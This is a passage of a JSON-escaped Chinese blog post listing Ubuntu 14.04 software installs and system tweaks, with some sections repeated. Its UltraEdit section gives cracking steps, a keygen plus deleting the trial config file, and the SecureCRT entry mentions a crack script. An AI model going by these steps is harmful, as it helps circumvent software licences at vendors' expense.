class=\"line\">/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0</div><div class=\"line\"></div><div class=\"line\"># auto mount D disk</div><div class=\"line\">/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0</div><div class=\"line\"></div><div class=\"line\"># auto mount E disk</div><div class=\"line\">/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0</div></pre></td></tr></table></figure></p>\n<p><strong>说明</strong>：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。</p>\n<h3 id=\"6-Eclipse设置-Javadoc背景色\"><a href=\"#6-Eclipse设置-Javadoc背景色\" class=\"headerlink\" title=\"6. Eclipse设置 Javadoc背景色\"></a>6. Eclipse设置 Javadoc背景色</h3><p>命令：</p>\n<blockquote>\n<p>cd /usr/share/themes/Ambiance/gtk-2.0<br>sudo gedit gtkrc</p>\n</blockquote>\n<p>最终12.04及14.04修改gtkrc文件内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gtk-color-scheme = &quot;base_color:#C7EDCC\\nfg_color:#4c4c4c\\ntooltip_fg_color:#000000\\nselected_bg_color:#f07746\\nselected_fg_color:#FFFFFF\\ntext_color:#3C3C3C\\nbg_color:#f6f4f2\\ntooltip_bg_color:#f2edbc\\nlink_color:#DD4814&quot;</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<a href=\"http://blog.csdn.net/qxb1229/article/details/8265616\" target=\"_blank\" rel=\"external\">Ubuntu 12.04 Eclipse设置 Javadoc背景色</a></p>\n<h3 id=\"7-thundbird-exchange插件ExQuilla\"><a href=\"#7-thundbird-exchange插件ExQuilla\" class=\"headerlink\" title=\"7. thundbird exchange插件ExQuilla\"></a>7. thundbird exchange插件ExQuilla</h3><h2 id=\"四、软件储备\"><a href=\"#四、软件储备\" class=\"headerlink\" title=\"四、软件储备\"></a>四、软件储备</h2><h3 id=\"1-Ubuntu下的阿里旺旺软件\"><a href=\"#1-Ubuntu下的阿里旺旺软件\" class=\"headerlink\" title=\"1. Ubuntu下的阿里旺旺软件\"></a>1. Ubuntu下的阿里旺旺软件</h3><p>阿里旺旺的 Ubuntu 下的版本，下载地址是：<a href=\"http://ge.tt/8sPpGIA\" target=\"_blank\" rel=\"external\">http://ge.tt/8sPpGIA</a><br><strong>注</strong>：百度网盘里有。</p>\n<p>如遇无法登陆的情况，解除登陆限制即可。</p>\n<p><strong>参考</strong>：<a href=\"http://wowubuntu.com/aliwangwang.html\" target=\"_blank\" rel=\"external\">http://wowubuntu.com/aliwangwang.html</a></p>\n<h3 id=\"3-UltraEdit\"><a href=\"#3-UltraEdit\" class=\"headerlink\" title=\"3.UltraEdit\"></a>3.UltraEdit</h3><p>下载页面：<a href=\"http://www.ultraedit.com/downloads/uex.html\" target=\"_blank\" rel=\"external\">http://www.ultraedit.com/downloads/uex.html</a><br>下载地址：<a href=\"http://www.ultraedit.com/files/uex/Ubuntu/\" target=\"_blank\" rel=\"external\">http://www.ultraedit.com/files/uex/Ubuntu/</a><br><strong>注</strong>：百度网盘里有。</p>\n<h4 id=\"关于破解\"><a href=\"#关于破解\" class=\"headerlink\" title=\"关于破解\"></a>关于破解</h4><ol>\n<li>下载破解器：keygen_ue(百度网盘里有)</li>\n<li>删除配置目录：~/.idm/uex/uex.conf</li>\n</ol>\n<p><strong>参考</strong>：<br><a href=\"http://mjzhou.com/?p=158\" target=\"_blank\" rel=\"external\">UltraEdit for Linux破解</a><br><a href=\"http://blog.itpub.net/12216142/viewspace-708801\" target=\"_blank\" rel=\"external\">UltraEdit for linux 不断试用30天的方法 </a></p>\n<h3 id=\"4-UltraCompareX\"><a href=\"#4-UltraCompareX\" class=\"headerlink\" title=\"4. UltraCompareX\"></a>4. UltraCompareX</h3><p>下载页面：<a href=\"http://www.ultraedit.com/downloads/ucx.html\" target=\"_blank\" rel=\"external\">http://www.ultraedit.com/downloads/ucx.html</a><br>下载地址：<a href=\"http://www.ultraedit.com/files/ucx/Ubuntu/\" target=\"_blank\" rel=\"external\">http://www.ultraedit.com/files/ucx/Ubuntu/</a></p>\n<p><strong>注</strong>：百度网盘里有。</p>\n<h3 id=\"5-飞鸽传书GNU-Linux版\"><a href=\"#5-飞鸽传书GNU-Linux版\" class=\"headerlink\" title=\"5. 飞鸽传书GNU/Linux版\"></a>5. 飞鸽传书GNU/Linux版</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install iptux</p>\n</blockquote>\n<p>下载地址：<a href=\"https://code.google.com/p/iptux/downloads/list\" target=\"_blank\" rel=\"external\">https://code.google.com/p/iptux/downloads/list</a></p>\n<p><strong>参考</strong>：<a href=\"http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF\" target=\"_blank\" rel=\"external\">信使</a></p>\n<h3 id=\"6-winusb\"><a href=\"#6-winusb\" class=\"headerlink\" title=\"6. winusb\"></a>6. winusb</h3><p>安装命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo add-apt-repository ppa:colingille/freshlight</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install winusb</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<a href=\"http://wiki.deepin.org/index.php?title=WinUSB\" target=\"_blank\" rel=\"external\">WinUSB</a></p>\n<h3 id=\"7-kwplayer\"><a href=\"#7-kwplayer\" class=\"headerlink\" title=\"7. kwplayer\"></a>7. kwplayer</h3><p>需要下载 python3-xlib_xx.deb, python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.<br>先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.<br>当然, 也可以在终端里安装, 比如:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo dpkg -i kwplayer_xx.deb</div><div class=\"line\">sudo apt-get -f install</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<br><a href=\"https://github.com/LiuLang/kwplayer\" target=\"_blank\" rel=\"external\">https://github.com/LiuLang/kwplayer</a><br><a href=\"https://github.com/LiuLang/kwplayer-packages\" target=\"_blank\" rel=\"external\">https://github.com/LiuLang/kwplayer-packages</a></p>\n<h3 id=\"8-Folder-Color\"><a href=\"#8-Folder-Color\" class=\"headerlink\" title=\"8. Folder Color\"></a>8. Folder Color</h3><p>该软件已经集成到Ubuntu 15.04默认库中。<br>ubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。</p>\n<p>安装命令如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo add-apt-repository ppa:costales/folder-color</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install folder-color</div><div class=\"line\">nautilus -q</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<a href=\"http://imcn.me/html/y2015/23176.html\" target=\"_blank\" rel=\"external\">Folder Color 已添加到 Ubuntu 15.04 默认库中</a></p>\n<h3 id=\"ubuntu截图默认保存位置\"><a href=\"#ubuntu截图默认保存位置\" class=\"headerlink\" title=\"ubuntu截图默认保存位置\"></a>ubuntu截图默认保存位置</h3><p><strong>参考</strong>：<a href=\"http://askubuntu.com/a/134469\" target=\"_blank\" rel=\"external\">Default save directory for gnome-screenshot?</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" /></p>\n<p>修改软件源为163的源。</p>\n<h2 id=\"一、应用软件\"><a href=\"#一、应用软件\" class=\"headerlink\" title=\"一、应用软件\"></a>一、应用软件</h2><h3 id=\"1-安装vim\"><a href=\"#1-安装vim\" class=\"headerlink\" title=\"1. 安装vim\"></a>1. 安装vim</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install vim</p>\n</blockquote>\n<h3 id=\"2-chrome\"><a href=\"#2-chrome\" class=\"headerlink\" title=\"2. chrome\"></a>2. chrome</h3><p>直接登录官方网站下载deb包。<br><a href=\"https://www.google.com/intl/zh-CN/chrome/browser/\">https://www.google.com/intl/zh-CN/chrome/browser/</a></p>\n<p><strong>注</strong>：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。</p>\n<h3 id=\"3-截图工具shutter\"><a href=\"#3-截图工具shutter\" class=\"headerlink\" title=\"3. 截图工具shutter\"></a>3. 截图工具shutter</h3><p>ubuntu软件中心可下载。</p>\n<p>14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。</p>\n<p><strong>设置自定义快捷键方法</strong>：设置 -&gt; 键盘 -&gt; 快捷键 -&gt; 自定义快捷键</p>\n<p>命令：</p>\n<blockquote>\n<p>shutter -s</p>\n</blockquote>\n<p><strong>注</strong>：系统自带的截图工具也不错。</p>","more":"<h3 id=\"4-unity-tweak-tool\"><a href=\"#4-unity-tweak-tool\" class=\"headerlink\" title=\"4. unity-tweak-tool\"></a>4. unity-tweak-tool</h3><p>unity桌面配置工具, ubuntu软件中心可下载。</p>\n<p>命令：</p>\n<blockquote>\n<p>sudo apt-get install unity-tweak-tool</p>\n</blockquote>\n<h3 id=\"5-极点五笔输入法\"><a href=\"#5-极点五笔输入法\" class=\"headerlink\" title=\"5. 极点五笔输入法\"></a>5. 极点五笔输入法</h3><p>使用系统自带的极点五笔输入法<br>14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。</p>\n<h3 id=\"6-安装gnome-panel\"><a href=\"#6-安装gnome-panel\" class=\"headerlink\" title=\"6. 安装gnome-panel\"></a>6. 安装gnome-panel</h3><p>gnome面板工具，包含 <strong>gnome-desktop-item-edit</strong> 命令，用于创建桌面图标。</p>\n<p>命令：</p>\n<blockquote>\n<p>sudo apt-get install gnome-panel</p>\n</blockquote>\n<p>例如：</p>\n<blockquote>\n<p><code>gnome-desktop-item-edit ~/Desktop/ --create-new</code><br>gnome-desktop-item-edit ~/Desktop/app.desktop</p>\n</blockquote>\n<h3 id=\"7-百度准入go-bnac\"><a href=\"#7-百度准入go-bnac\" class=\"headerlink\" title=\"7. 百度准入go-bnac\"></a>7. 百度准入go-bnac</h3><p>百度网盘里应该有。<br>在百度工作专用，用于linux环境下连接百度准入。</p>\n<h3 id=\"8-bcompare\"><a href=\"#8-bcompare\" class=\"headerlink\" title=\"8. bcompare\"></a>8. bcompare</h3><p>安装包，百度网盘有。<br><strong>注</strong>：依赖ia32-libs</p>\n<h3 id=\"9-RabbitVCS\"><a href=\"#9-RabbitVCS\" class=\"headerlink\" title=\"9. RabbitVCS\"></a>9. RabbitVCS</h3><p>安装步骤：</p>\n<blockquote>\n<p>sudo add-apt-repository ppa:rabbitvcs/ppa<br>sudo apt-get update<br>sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit</p>\n</blockquote>\n<p><strong>说明</strong>：重启文档管理器，使用rabbitvcs-nautilus3生效。</p>\n<blockquote>\n<p>nautilus -q</p>\n</blockquote>\n<p><strong>注</strong>：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。</p>\n<p><strong>参考</strong>：<a href=\"http://www.elain.org/?p=742\">ubuntu软件—RabbitVCS : TortoiseSVN 的替代者</a></p>\n<h3 id=\"10-VPN工具\"><a href=\"#10-VPN工具\" class=\"headerlink\" title=\"10. VPN工具\"></a>10. VPN工具</h3><p>优先使用cisco Anyconnect VPN Tool。</p>\n<p>如果连接不成功，则可以考虑安装openconnect。<br>安装命令：</p>\n<blockquote>\n<p>sudo apt-get install network-manager-openconnect-gnome</p>\n</blockquote>\n<p>连接VPN命令：</p>\n<blockquote>\n<p>sudo openconnect vpn.sohu-inc.com</p>\n</blockquote>\n<h3 id=\"11-右键在当前位置打开终端\"><a href=\"#11-右键在当前位置打开终端\" class=\"headerlink\" title=\"11. 右键在当前位置打开终端\"></a>11. 右键在当前位置打开终端</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install nautilus-open-terminal</p>\n</blockquote>\n<p><strong>注</strong>：安装完成后，需要重启文件管理器</p>\n<blockquote>\n<p>nautilus -q</p>\n</blockquote>\n<h3 id=\"12-设置chrome代理\"><a href=\"#12-设置chrome代理\" class=\"headerlink\" title=\"12. 设置chrome代理\"></a>12. 设置chrome代理</h3><p><strong>百度工作</strong>：使用chrome插件 <strong>Proxy SwitchySharp</strong> 加载公司代理配置。<br><strong>搜狐工作</strong>：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。</p>\n<h3 id=\"13-ubuntu打印机\"><a href=\"#13-ubuntu打印机\" class=\"headerlink\" title=\"13. ubuntu打印机\"></a>13. ubuntu打印机</h3><p><strong>百度工作</strong>：<br>参考<a href=\"http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA\">http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA</a></p>\n<h3 id=\"14-经典菜单classicmenu-indicator\"><a href=\"#14-经典菜单classicmenu-indicator\" class=\"headerlink\" title=\"14. 经典菜单classicmenu-indicator\"></a>14. 经典菜单classicmenu-indicator</h3><p>ubuntu软件中心有下载。</p>\n<p>命令：</p>\n<blockquote>\n<p><code>sudo apt-get install --fix-missing classicmenu-indicator</code></p>\n</blockquote>\n<h3 id=\"15-rar-zip格式压缩工具\"><a href=\"#15-rar-zip格式压缩工具\" class=\"headerlink\" title=\"15. rar/zip格式压缩工具\"></a>15. rar/zip格式压缩工具</h3><p>压缩&amp;解压功能，能与ubuntu自带的归档管理器集成。</p>\n<p>安装命令：</p>\n<blockquote>\n<p>sudo apt-get install rar unrar p7zip-full</p>\n</blockquote>\n<p>卸载命令：</p>\n<blockquote>\n<p>sudo apt-get remove rar unrar p7zip-full</p>\n</blockquote>\n<h3 id=\"16-chmsee\"><a href=\"#16-chmsee\" class=\"headerlink\" title=\"16. chmsee\"></a>16. chmsee</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install chmsee</p>\n</blockquote>\n<p>软件源里可能没有chmsee，网上有已经打包好的deb包。<br><strong>注</strong>：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb</p>\n<p><strong>参考</strong>：<a href=\"http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html\">chmsee_1.3.1.1-1~getdeb2_amd64.deb</a></p>\n<h3 id=\"17-virtualbox\"><a href=\"#17-virtualbox\" class=\"headerlink\" title=\"17. virtualbox\"></a>17. virtualbox</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install virtualbox-qt</p>\n</blockquote>\n<h3 id=\"18-LONGENE-QQ2013\"><a href=\"#18-LONGENE-QQ2013\" class=\"headerlink\" title=\"18. LONGENE QQ2013\"></a>18. LONGENE QQ2013</h3><p><strong>前提条件</strong>：64位系统需要安装ia32-libs</p>\n<p>安装步骤：</p>\n<blockquote>\n<p>deb <a href=\"http://archive.ubuntu.com/ubuntu/\">http://archive.ubuntu.com/ubuntu/</a> raring main restricted universe multiverse<br>sudo apt-get update<br>sudo apt-get install ia32-libs<br>sudo dpkg -i WineQQ2013-20131120-Longene.deb</p>\n</blockquote>\n<p><strong>注</strong>：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。</p>\n<p><strong>参考</strong>：<a href=\"http://www.longene.org/forum/viewtopic.php?t=4700\">wine qq 2013 for linux Ubuntu 64位兼容</a></p>\n<h3 id=\"19-markdown编辑器haroopad\"><a href=\"#19-markdown编辑器haroopad\" class=\"headerlink\" title=\"19. markdown编辑器haroopad\"></a>19. markdown编辑器haroopad</h3><p><strong>下载地址</strong>：<a href=\"http://pad.haroopress.com/user.html\">http://pad.haroopress.com/user.html</a></p>\n<h3 id=\"20-wps-office\"><a href=\"#20-wps-office\" class=\"headerlink\" title=\"20. wps-office\"></a>20. wps-office</h3><p><strong>下载地址</strong>：<a href=\"http://linux.wps.cn/\">http://linux.wps.cn/</a></p>\n<p>安装字体管理器命令：</p>\n<blockquote>\n<p>sudo apt-get install font-manager</p>\n</blockquote>\n<p><strong>注</strong>：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)</p>\n<h3 id=\"21-有道词典\"><a href=\"#21-有道词典\" class=\"headerlink\" title=\"21. 有道词典\"></a>21. 有道词典</h3><p><strong>下载地址</strong>：<a href=\"http://cidian.youdao.com/index-linux.html\">http://cidian.youdao.com/index-linux.html</a></p>\n<p><strong>说明</strong>：<br>使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。<br>英文发音有问题。</p>\n<h3 id=\"22-flashplayer独立播放器\"><a href=\"#22-flashplayer独立播放器\" class=\"headerlink\" title=\"22. flashplayer独立播放器\"></a>22. flashplayer独立播放器</h3><p><strong>下载地址</strong>：<a href=\"http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz\">http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz</a></p>\n<h3 id=\"23-切换默认的shell版本\"><a href=\"#23-切换默认的shell版本\" class=\"headerlink\" title=\"23. 切换默认的shell版本\"></a>23. 切换默认的shell版本</h3><blockquote>\n<p>sudo dpkg-reconfigure dash</p>\n</blockquote>\n<p><strong>参考</strong>：<a href=\"http://blog.csdn.net/breeze5428/article/details/27353583\">Shell编程笔记——Syntax error: “(“ unexpected</a></p>\n<h3 id=\"24-百度网盘linux版\"><a href=\"#24-百度网盘linux版\" class=\"headerlink\" title=\"24. 百度网盘linux版\"></a>24. 百度网盘linux版</h3><p>Debian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;<br>有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:</p>\n<blockquote>\n<p>$ sudo dpkg -i bcloud-x.x.x.deb<br>$ sudo apt-get -f install</p>\n</blockquote>\n<p><strong>参考</strong>：<br><a href=\"https://github.com/LiuLang/bcloud\">https://github.com/LiuLang/bcloud</a><br><a href=\"https://github.com/LiuLang/bcloud-packages\">https://github.com/LiuLang/bcloud-packages</a></p>\n<h3 id=\"25-Ubuntu-14-04-64位字体美化-使用文泉驿微黑\"><a href=\"#25-Ubuntu-14-04-64位字体美化-使用文泉驿微黑\" class=\"headerlink\" title=\"25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)\"></a>25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)</h3><blockquote>\n<p>sudo aptitude install ttf-wqy-microhei</p>\n</blockquote>\n<p><strong>参考</strong>：<a href=\"http://blog.csdn.net/tao_627/article/details/24180781\">Ubuntu 14.04 64位字体美化(使用文泉驿微黑)</a></p>\n<h3 id=\"26-安装gstreamer0-10-ffmpeg\"><a href=\"#26-安装gstreamer0-10-ffmpeg\" class=\"headerlink\" title=\"26. 安装gstreamer0.10-ffmpeg\"></a>26. 安装gstreamer0.10-ffmpeg</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo add-apt-repository ppa:mc3man/trusty-media</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install gstreamer0.10-ffmpeg</div></pre></td></tr></table></figure>\n<p><strong>参考</strong>：[Ubuntu 14.04如何轻松启用H.264视频支持][11]</p>\n<h3 id=\"27-安装curl\"><a href=\"#27-安装curl\" class=\"headerlink\" title=\"27. 安装curl\"></a>27. 安装curl</h3><blockquote>\n<p>sudo apt-get install curl</p>\n</blockquote>\n<h2 id=\"二、开发软件\"><a href=\"#二、开发软件\" class=\"headerlink\" title=\"二、开发软件\"></a>二、开发软件</h2><h3 id=\"1-安装git\"><a href=\"#1-安装git\" class=\"headerlink\" title=\"1. 安装git\"></a>1. 安装git</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install git</p>\n</blockquote>\n<h3 id=\"2-securecrt\"><a href=\"#2-securecrt\" class=\"headerlink\" title=\"2. securecrt\"></a>2. securecrt</h3><p>securecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)</p>\n<h3 id=\"3-subversion\"><a href=\"#3-subversion\" class=\"headerlink\" title=\"3. subversion\"></a>3. subversion</h3><p><strong>注</strong>：可能安装rabbitvcs时已经安装</p>\n<p>命令：</p>\n<blockquote>\n<p>sudo apt-get install subversion<br>sudo apt-get install libapache2-svn</p>\n</blockquote>\n<h3 id=\"4-安装mysql\"><a href=\"#4-安装mysql\" class=\"headerlink\" title=\"4. 安装mysql\"></a>4. 安装mysql</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install mysql-server<br>sudo apt-get install mysql-workbench</p>\n</blockquote>\n<h3 id=\"5-java\"><a href=\"#5-java\" class=\"headerlink\" title=\"5. java\"></a>5. java</h3><p>下载jdk bin或者tar.gz包，并安装。</p>\n<p>修改java配置 ~/.profile<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">JAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51</div><div class=\"line\">CLASSPATH=$JAVA_HOME/jre/lib</div><div class=\"line\">PATH=$PATH:$JAVA_HOME/bin</div><div class=\"line\">export JAVA_HOME CLASSPATH PATH</div></pre></td></tr></table></figure></p>\n<h3 id=\"6-eclipse／STS\"><a href=\"#6-eclipse／STS\" class=\"headerlink\" title=\"6. eclipse／STS\"></a>6. eclipse／STS</h3><p><strong>最新的STS下载地址</strong>：<a href=\"http://spring.io/tools/sts/\">http://spring.io/tools/sts/</a></p>\n<h3 id=\"7-maven\"><a href=\"#7-maven\" class=\"headerlink\" title=\"7. maven\"></a>7. maven</h3><h2 id=\"三、系统配置\"><a href=\"#三、系统配置\" class=\"headerlink\" title=\"三、系统配置\"></a>三、系统配置</h2><h3 id=\"1-设置root密码\"><a href=\"#1-设置root密码\" class=\"headerlink\" title=\"1. 设置root密码\"></a>1. 设置root密码</h3><p>命令：</p>\n<blockquote>\n<p>sudo passwd root</p>\n</blockquote>\n<h3 id=\"2-合上笔记本不休眠\"><a href=\"#2-合上笔记本不休眠\" class=\"headerlink\" title=\"2. 合上笔记本不休眠\"></a>2. 合上笔记本不休眠</h3><p>编辑/etc/default/acpi-support<br>找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false</p>\n<h3 id=\"3-中文语言支持\"><a href=\"#3-中文语言支持\" class=\"headerlink\" title=\"3. 中文语言支持\"></a>3. 中文语言支持</h3><h3 id=\"4-用户目录英文名\"><a href=\"#4-用户目录英文名\" class=\"headerlink\" title=\"4. 用户目录英文名\"></a>4. 用户目录英文名</h3><p>中文ubuntu里用户目录里的路径改成英文</p>\n<p>执行命令：</p>\n<blockquote>\n<p>export LANG=en_US<br>xdg-user-dirs-gtk-update</p>\n</blockquote>\n<p>接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。<br>在终端中输入命令：export LANG=zh_CN<br>关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。<br>选择不再提示，并取消修改。<br>主目录的中文转英文就完成了~</p>\n<h3 id=\"5-自动挂载windows分区\"><a href=\"#5-自动挂载windows分区\" class=\"headerlink\" title=\"5. 自动挂载windows分区\"></a>5. 自动挂载windows分区</h3><p>查看硬盘的分区情况：<br><code>df -h</code> 或者 <code>sudo fdisk -l</code> 或者使用GParted分区编辑器查看。</p>\n<p>编辑/etc/fstab文件，添加如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"># auto mount C disk</div><div class=\"line\">/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0</div><div class=\"line\"></div><div class=\"line\"># auto mount D disk</div><div class=\"line\">/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0</div><div class=\"line\"></div><div class=\"line\"># auto mount E disk</div><div class=\"line\">/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0</div></pre></td></tr></table></figure></p>\n<p><strong>说明</strong>：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。</p>\n<h3 id=\"6-Eclipse设置-Javadoc背景色\"><a href=\"#6-Eclipse设置-Javadoc背景色\" class=\"headerlink\" title=\"6. Eclipse设置 Javadoc背景色\"></a>6. Eclipse设置 Javadoc背景色</h3><p>命令：</p>\n<blockquote>\n<p>cd /usr/share/themes/Ambiance/gtk-2.0<br>sudo gedit gtkrc</p>\n</blockquote>\n<p>最终12.04及14.04修改gtkrc文件内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gtk-color-scheme = &quot;base_color:#C7EDCC\\nfg_color:#4c4c4c\\ntooltip_fg_color:#000000\\nselected_bg_color:#f07746\\nselected_fg_color:#FFFFFF\\ntext_color:#3C3C3C\\nbg_color:#f6f4f2\\ntooltip_bg_color:#f2edbc\\nlink_color:#DD4814&quot;</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<a href=\"http://blog.csdn.net/qxb1229/article/details/8265616\">Ubuntu 12.04 Eclipse设置 Javadoc背景色</a></p>\n<h3 id=\"7-thundbird-exchange插件ExQuilla\"><a href=\"#7-thundbird-exchange插件ExQuilla\" class=\"headerlink\" title=\"7. thundbird exchange插件ExQuilla\"></a>7. thundbird exchange插件ExQuilla</h3><h2 id=\"四、软件储备\"><a href=\"#四、软件储备\" class=\"headerlink\" title=\"四、软件储备\"></a>四、软件储备</h2><h3 id=\"1-Ubuntu下的阿里旺旺软件\"><a href=\"#1-Ubuntu下的阿里旺旺软件\" class=\"headerlink\" title=\"1. Ubuntu下的阿里旺旺软件\"></a>1. Ubuntu下的阿里旺旺软件</h3><p>阿里旺旺的 Ubuntu 下的版本，下载地址是：<a href=\"http://ge.tt/8sPpGIA\">http://ge.tt/8sPpGIA</a><br><strong>注</strong>：百度网盘里有。</p>\n<p>如遇无法登陆的情况，解除登陆限制即可。</p>\n<p><strong>参考</strong>：<a href=\"http://wowubuntu.com/aliwangwang.html\">http://wowubuntu.com/aliwangwang.html</a></p>\n<h3 id=\"3-UltraEdit\"><a href=\"#3-UltraEdit\" class=\"headerlink\" title=\"3.UltraEdit\"></a>3.UltraEdit</h3><p>下载页面：<a href=\"http://www.ultraedit.com/downloads/uex.html\">http://www.ultraedit.com/downloads/uex.html</a><br>下载地址：<a href=\"http://www.ultraedit.com/files/uex/Ubuntu/\">http://www.ultraedit.com/files/uex/Ubuntu/</a><br><strong>注</strong>：百度网盘里有。</p>\n<h4 id=\"关于破解\"><a href=\"#关于破解\" class=\"headerlink\" title=\"关于破解\"></a>关于破解</h4><ol>\n<li>下载破解器：keygen_ue(百度网盘里有)</li>\n<li>删除配置目录：~/.idm/uex/uex.conf</li>\n</ol>\n<p><strong>参考</strong>：<br><a href=\"http://mjzhou.com/?p=158\">UltraEdit for Linux破解</a><br><a href=\"http://blog.itpub.net/12216142/viewspace-708801\">UltraEdit for linux 不断试用30天的方法 </a></p>\n<h3 id=\"4-UltraCompareX\"><a href=\"#4-UltraCompareX\" class=\"headerlink\" title=\"4. UltraCompareX\"></a>4. UltraCompareX</h3><p>下载页面：<a href=\"http://www.ultraedit.com/downloads/ucx.html\">http://www.ultraedit.com/downloads/ucx.html</a><br>下载地址：<a href=\"http://www.ultraedit.com/files/ucx/Ubuntu/\">http://www.ultraedit.com/files/ucx/Ubuntu/</a></p>\n<p><strong>注</strong>：百度网盘里有。</p>\n<h3 id=\"5-飞鸽传书GNU-Linux版\"><a href=\"#5-飞鸽传书GNU-Linux版\" class=\"headerlink\" title=\"5. 飞鸽传书GNU/Linux版\"></a>5. 飞鸽传书GNU/Linux版</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install iptux</p>\n</blockquote>\n<p>下载地址：<a href=\"https://code.google.com/p/iptux/downloads/list\">https://code.google.com/p/iptux/downloads/list</a></p>\n<p><strong>参考</strong>：<a href=\"http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF\">信使</a></p>\n<h3 id=\"6-winusb\"><a href=\"#6-winusb\" 